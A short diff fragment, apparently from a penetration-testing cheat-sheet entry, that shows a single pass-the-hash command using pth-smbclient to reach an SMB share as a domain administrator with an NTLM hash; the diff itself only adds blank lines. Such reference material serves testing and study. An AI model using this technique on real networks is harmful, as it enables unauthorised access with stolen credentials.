@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:26:35.786286+00:00'
 ```bash
 pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/Share
 ```
+
+
